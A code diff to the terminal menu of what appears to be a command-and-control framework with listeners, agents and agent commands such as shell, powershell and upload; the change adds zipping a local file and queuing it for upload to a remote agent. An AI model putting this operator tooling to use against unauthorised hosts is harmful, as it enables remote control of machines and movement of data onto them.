@@ -4,6 +4,7 @@
 # if not terminal_menu.chosen_accept_key:
 #   exit()
 
+import zipfile
 import readline
 from time import time
 from random import choice
@@ -13,7 +14,7 @@ from collections import OrderedDict
 from simple_term_menu import TerminalMenu
 
 from colorama import Fore, Back, Style
-from os import popen, system, getcwd, name, get_terminal_size
+from os import popen, system, getcwd, name, get_terminal_size, chdir, remove
 
 from core.stash import *
 from core.less import LessPy
@@ -27,6 +28,9 @@ class MainMenu :
         self.stash = stash
         self.debug = debug
 
+        self.downloadPath = path.join(getcwd(), 'downloads')
+        self.uploadPath = path.join(getcwd(), 'uploads')
+
         # general styling
         self.h_style = ('bg_green', 'fg_black', 'italics')
         self.h_kill_style = ('bg_red', 'italics')
@@ -38,7 +42,7 @@ class MainMenu :
         self.index = 0
         self.menu_entry = ['Listeners', 'Agents', 'Overview', 'Quit']
 
-        self.CMD = ['shell', 'powershell', 'sleep', 'rename', 'download', 'back_to_previous_menu']
+        self.CMD = ['shell', 'powershell', 'sleep', 'rename', 'upload', 'download_XXnotyetXX', 'back_to_previous_menu']
 
         self.listener_types = ['HTTPS', 'HTTP', 'back']
         self.payloads_types = OrderedDict()
@@ -280,18 +284,41 @@ class MainMenu :
         while cmd == '' or cmd.split()[0] not in self.CMD:
             cmd = input(f'{header}\n{Fore.GREEN}{Style.BRIGHT}{self.cursor}{Style.RESET_ALL}')
         if 'back_to_previous_menu' not in cmd:
-            # if cmd.split()[0] == 'download':
-            #     #### DOWNLOAD FILE HERE COMPLETE!!!
-            #     file_to_zip = ''
-            #     zip_out = ''
-            #     cwd = os.getcwd()
-            #     os.chdir('')
-            #     with zipfile.ZipFile(zip_out,mode='w',compression=zipfile.ZIP_DEFLATED,allowZip64=False,compresslevel=9) as zf:
-            #         zf.write(file_to_zip)
-            #     os.chdir(cwd)
+            cmd_arr = cmd.split()
+            if len(cmd_arr) > 1:
+                if cmd_arr[0] == 'upload':
+                    #### UPLOAD FILE HERE COMPLETE!!!
+                    choosen_file = ' '.join(cmd_arr[1:])
+                    cwd = getcwd()
+                    if choosen_file.startswith('/'):
+                        file_to_zip = choosen_file
+                    else:
+                        file_to_zip = path.join(cwd, choosen_file)
 
-            command_code = self.gen_command_code()
-            self.stash.set_agent_job(command_code, agent, cmd)
+                    # warning(file_to_zip)
+                    file_name = file_to_zip.split('/')[-1]
+                    path_to_file = '/'.join(file_to_zip.split('/')[:-1])
+
+                    if path.isfile(file_to_zip):
+                        zip_out = path.join(self.uploadPath, f'{file_name}.zip')
+                        if path.isfile(zip_out):
+                            remove(zip_out)
+                        chdir(path_to_file)
+                        with zipfile.ZipFile(zip_out,mode='w',compression=zipfile.ZIP_DEFLATED,allowZip64=False,compresslevel=9) as zf:
+                            zf.write(file_name)
+                        chdir(cwd)
+                        command_code = self.gen_command_code()
+                        cmd = f'upload {file_name}.zip'
+                    else:
+                        command_code = False
+                else:
+                    command_code = self.gen_command_code()
+
+                if command_code:
+                    self.stash.set_agent_job(command_code, agent, cmd)
+
+            else:
+                error('Not enough Args >.>')
 
     def gen_command_code(self):
         command_code = ''.join(choice(ascii_letters) for i in range(10))
